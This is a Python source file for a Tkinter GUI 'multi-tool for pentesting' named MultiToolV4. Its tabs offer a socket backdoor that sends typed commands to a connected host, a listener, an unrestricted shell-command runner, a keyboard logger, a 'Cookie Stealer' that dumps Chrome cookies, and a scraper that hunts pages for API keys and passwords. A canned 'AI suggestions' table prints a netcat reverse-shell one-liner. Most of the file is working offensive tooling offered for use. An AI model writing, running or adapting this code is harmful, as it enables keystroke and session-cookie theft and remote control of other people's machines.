import socket
import subprocess
import nmap
import threading
import tkinter as tk
from tkinter import simpledialog, messagebox, scrolledtext
from tkinter import ttk
import logging
from logging.handlers import RotatingFileHandler
import browser_cookie3
from pynput import keyboard
import requests
from bs4 import BeautifulSoup
import re

# Setup Logging with Rotation
log_file = 'multi_tool.log'
log_handler = RotatingFileHandler(log_file, maxBytes=1024*1024, backupCount=5)  # 1MB per log, 5 backups
logging.basicConfig(handlers=[log_handler], level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Constants
LHOST = "localhost"
RHOST = "target_ip"
PROXY = "proxy_ip:proxy_port"
NMAP_ARGS = "-Pn -sT -O"

# Banner to be printed
def print_banner():
    """Prints the banner for the tool."""
    banner = """
    ███╗   ██╗██╗   ██╗██╗     ██████╗██╗   ██╗██╗      ██████╗██╗
    ████╗  ██║██║   ██║██║     ██╔════╝██║   ██║██║     ██╔════╝██║
    ██╔██╗ ██║██║   ██║██║     ██║     ███████║██║     ██║     ██║
    ██║╚██╗██║██║   ██║██║     ██║     ██╔══██║██║     ██║     ██║
    ██║ ╚████║╚██████╔╝███████╗╚██████╗██║  ██║███████╗╚██████╗██║
    ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝
    MultiToolV4 by kdairatchi 🛠️ - Enhanced Multi-Tool for Pentesting
    """
    print(banner)

# ===================== Utility Functions ===================== #

def show_message(title, message):
    """Show a simple message box."""
    messagebox.showinfo(title, message)

def handle_exception(exception):
    """Log and display an exception."""
    logging.error(str(exception))
    messagebox.showerror("Error", str(exception))

# ===================== Scanning Functions ===================== #

def scan_target(rhost, output_area):
    """Perform a passive scan using Nmap and output results to the GUI."""
    try:
        logging.info(f"Starting scan for target: {rhost}")
        nm = nmap.PortScanner()
        nm.scan(rhost, arguments=NMAP_ARGS)
        os_info = get_os_info(nm, rhost)
        result = f"Target OS: {os_info}\n{nm.csv()}"
        output_area.insert(tk.END, result + '\n')
    except Exception as e:
        handle_exception(e)

def get_os_info(nm, rhost):
    """Extract OS information from Nmap results."""
    try:
        return nm[rhost].get('osmatch', [{}])[0].get('name', 'Unknown')
    except KeyError:
        logging.warning(f"OS information not available for: {rhost}")
        return "Unknown OS"

# ===================== Listener & Backdoor ===================== #

def create_backdoor(lhost, port=8080, output_area=None):
    """Create a simple backdoor using sockets."""
    try:
        logging.info(f"Creating backdoor on {lhost}:{port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, port))
        sock.listen(1)
        output_area.insert(tk.END, f"Listening on {lhost}:{port}...\n")
        conn, addr = sock.accept()
        output_area.insert(tk.END, f"Connection established with {addr}\n")
        while True:
            cmd = simpledialog.askstring("Command Input", "Enter command:")
            if cmd.lower() in ['exit', 'quit']:
                logging.info("Backdoor session terminated by user.")
                break
            conn.sendall(cmd.encode())
            response = conn.recv(4096).decode()
            output_area.insert(tk.END, response + '\n')
        conn.close()
    except Exception as e:
        handle_exception(e)

def create_listener(lhost, port=8081, output_area=None):
    """Create a listener to receive incoming connections."""
    try:
        logging.info(f"Creating listener on {lhost}:{port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((lhost, port))
        sock.listen(1)
        output_area.insert(tk.END, f"Listening on {lhost}:{port}...\n")
        conn, addr = sock.accept()
        output_area.insert(tk.END, f"Connected to {addr}\n")
        while True:
            data = conn.recv(4096).decode()
            if not data:
                break
            output_area.insert(tk.END, f"Received: {data}\n")
        conn.close()
    except Exception as e:
        handle_exception(e)

# ===================== Terminal & AI ===================== #

def run_terminal_command(command, output_area):
    """Run any command from the terminal tab."""
    try:
        logging.info(f"Running command: {command}")
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_area.insert(tk.END, output.decode() + '\n')
        if error:
            output_area.insert(tk.END, error.decode() + '\n')
    except Exception as e:
        handle_exception(e)

def ai_suggestions(query, output_area):
    """Simulate AI suggestions for pentesting tasks based on user input."""
    suggestions = {
        "scan": "Use nmap or masscan for scanning. Example: nmap -sS -T4 target_ip",
        "exploit": "Use Metasploit for exploitation. Example: msfconsole -> search exploit.",
        "backdoor": "Reverse shell: nc -e /bin/bash target_ip 4444",
        "password": "Password cracking: Use Hydra or John the Ripper."
    }

    for key in suggestions:
        if key in query.lower():
            output_area.insert(tk.END, suggestions[key] + "\n")
            return
    output_area.insert(tk.END, "No AI suggestion found for the query.\n")

# ===================== Keylogger & Cookie Stealer ===================== #

def start_keylogger(output_area):
    """Start a simple keylogger."""
    def on_press(key):
        try:
            output_area.insert(tk.END, f'{key.char}\n')
        except AttributeError:
            output_area.insert(tk.END, f'{key}\n')

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    output_area.insert(tk.END, "Keylogger started...\n")

def steal_cookies(output_area):
    """Steal cookies from the browser."""
    try:
        output_area.insert(tk.END, "Stealing cookies from Chrome...\n")
        cj = browser_cookie3.chrome()
        for cookie in cj:
            output_area.insert(tk.END, f"Cookie: {cookie}\n")
        output_area.insert(tk.END, "Finished stealing cookies.\n")
    except Exception as e:
        handle_exception(e)

# ===================== Web Scraping and Cyber Intel ===================== #

def find_secrets(html, output_area):
    """Identify potential sensitive information (e.g., API keys, passwords) in the HTML."""
    regex_patterns = [
        r'(?i)(api_key|apikey|access_token|auth_token|secret|password)\s*[:=]\s*[\'"]?([A-Za-z0-9_-]+)[\'"]?',
        r'(?i)Bearer\s+([A-Za-z0-9_-]+)'
    ]
    for pattern in regex_patterns:
        matches = re.findall(pattern, html)
        if matches:
            output_area.insert(tk.END, f"Found potential secrets: {matches}\n")

def scrape_webpage(url, output_area):
    """Scrape data from a webpage and display in the GUI."""
    try:
        output_area.insert(tk.END, f"Scraping URL: {url}\n")
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            html_content = response.text

            # Scrape all paragraphs
            paragraphs = soup.find_all('p')
            output_area.insert(tk.END, "Paragraphs:\n")
            for para in paragraphs:
                output_area.insert(tk.END, para.get_text() + "\n")

            # Scrape all links
            links = soup.find_all('a', href=True)
            output_area.insert(tk.END, "Links:\n")
            for link in links:
                output_area.insert(tk.END, f"{link['href']}\n")

            # Scrape all headers (h1)
            headers = soup.find_all('h1')
            output_area.insert(tk.END, "Headers:\n")
            for header in headers:
                output_area.insert(tk.END, header.get_text() + "\n")

            # Find secrets in HTML
            output_area.insert(tk.END, "Looking for secrets...\n")
            find_secrets(html_content, output_area)

        else:
            output_area.insert(tk.END, f"Error: Unable to scrape URL (Status Code: {response.status_code})\n")
    except Exception as e:
        handle_exception(e)

# ===================== Web Crawler and Spider ===================== #

def crawl_website(url, output_area, depth=2):
    """Crawl a website for all links up to a specified depth."""
    try:
        output_area.insert(tk.END, f"Crawling URL: {url} (Depth: {depth})\n")
        visited = set()

        def crawl(url, depth):
            if depth == 0 or url in visited:
                return
            visited.add(url)
            response = requests.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')

            links = soup.find_all('a', href=True)
            output_area.insert(tk.END, f"Links on {url}:\n")
            for link in links:
                href = link['href']
                if href.startswith("http"):
                    output_area.insert(tk.END, f"{href}\n")
                    crawl(href, depth - 1)

        crawl(url, depth)
    except Exception as e:
        handle_exception(e)

# ===================== AI Wordlist Generator ===================== #

def generate_wordlist_from_content(content, output_area):
    """Generate a wordlist based on the content of a webpage."""
    words = re.findall(r'\b\w+\b', content)
    unique_words = set(words)

    output_area.insert(tk.END, "Generated Wordlist:\n")
    for word in unique_words:
        output_area.insert(tk.END, f"{word}\n")

# ===================== GUI & Application ===================== #

def create_gui():
    """Create the main GUI with tabbed interface."""
    root = tk.Tk()
    root.title("Multi Tool V4 by kdairatchi")

    # Create notebook for tabs
    notebook = ttk.Notebook(root)
    notebook.pack(expand=True, fill='both')

    # Backdoor Tab
    backdoor_tab = ttk.Frame(notebook)
    notebook.add(backdoor_tab, text="Backdoor")
    backdoor_output = scrolledtext.ScrolledText(backdoor_tab, wrap=tk.WORD)
    backdoor_output.pack(expand=True, fill='both')
    backdoor_button = tk.Button(backdoor_tab, text="Start Backdoor", 
                                command=lambda: threading.Thread(target=create_backdoor, 
                                                                  args=(LHOST, 8080, backdoor_output),
                                                                  daemon=True).start())
    backdoor_button.pack(pady=5)

    # Listener Tab
    listener_tab = ttk.Frame(notebook)
    notebook.add(listener_tab, text="Listener")
    listener_output = scrolledtext.ScrolledText(listener_tab, wrap=tk.WORD)
    listener_output.pack(expand=True, fill='both')
    listener_button = tk.Button(listener_tab, text="Start Listener", 
                                command=lambda: threading.Thread(target=create_listener, 
                                                                  args=(LHOST, 8081, listener_output),
                                                                  daemon=True).start())
    listener_button.pack(pady=5)

    # Terminal Tab
    terminal_tab = ttk.Frame(notebook)
    notebook.add(terminal_tab, text="Terminal")
    terminal_output = scrolledtext.ScrolledText(terminal_tab, wrap=tk.WORD)
    terminal_output.pack(expand=True, fill='both')
    terminal_command = tk.Entry(terminal_tab)
    terminal_command.pack(fill='x', padx=10, pady=5)
    terminal_button = tk.Button(terminal_tab, text="Run Command", 
                                command=lambda: run_terminal_command(terminal_command.get(), terminal_output))
    terminal_button.pack(pady=5)

    # Pentest AI Tab
    ai_tab = ttk.Frame(notebook)
    notebook.add(ai_tab, text="Pentest AI")
    ai_output = scrolledtext.ScrolledText(ai_tab, wrap=tk.WORD)
    ai_output.pack(expand=True, fill='both')
    ai_query = tk.Entry(ai_tab)
    ai_query.pack(fill='x', padx=10, pady=5)
    ai_button = tk.Button(ai_tab, text="Ask AI", 
                          command=lambda: ai_suggestions(ai_query.get(), ai_output))
    ai_button.pack(pady=5)

    # Keylogger Tab
    keylogger_tab = ttk.Frame(notebook)
    notebook.add(keylogger_tab, text="Keylogger")
    keylogger_output = scrolledtext.ScrolledText(keylogger_tab, wrap=tk.WORD)
    keylogger_output.pack(expand=True, fill='both')
    keylogger_button = tk.Button(keylogger_tab, text="Start Keylogger", 
                                 command=lambda: threading.Thread(target=start_keylogger, 
                                                                   args=(keylogger_output,), 
                                                                   daemon=True).start())
    keylogger_button.pack(pady=5)

    # Cookie Stealer Tab
    cookie_tab = ttk.Frame(notebook)
    notebook.add(cookie_tab, text="Cookie Stealer")
    cookie_output = scrolledtext.ScrolledText(cookie_tab, wrap=tk.WORD)
    cookie_output.pack(expand=True, fill='both')
    cookie_button = tk.Button(cookie_tab, text="Steal Cookies", 
                              command=lambda: steal_cookies(cookie_output))
    cookie_button.pack(pady=5)

    # Web Scraper Tab
    scraper_tab = ttk.Frame(notebook)
    notebook.add(scraper_tab, text="Web Scraper")
    scraper_output = scrolledtext.ScrolledText(scraper_tab, wrap=tk.WORD)
    scraper_output.pack(expand=True, fill='both')
    scraper_url = tk.Entry(scraper_tab)
    scraper_url.pack(fill='x', padx=10, pady=5)
    scraper_button = tk.Button(scraper_tab, text="Scrape Website", 
                               command=lambda: scrape_webpage(scraper_url.get(), scraper_output))
    scraper_button.pack(pady=5)

    # Web Crawler Tab
    crawler_tab = ttk.Frame(notebook)
    notebook.add(crawler_tab, text="Web Crawler")
    crawler_output = scrolledtext.ScrolledText(crawler_tab, wrap=tk.WORD)
    crawler_output.pack(expand=True, fill='both')
    crawler_url = tk.Entry(crawler_tab)
    crawler_url.pack(fill='x', padx=10, pady=5)
    crawler_button = tk.Button(crawler_tab, text="Start Crawl", 
                               command=lambda: crawl_website(crawler_url.get(), crawler_output))
    crawler_button.pack(pady=5)

    root.mainloop()

if __name__ == "__main__":
    print_banner()
    create_gui()
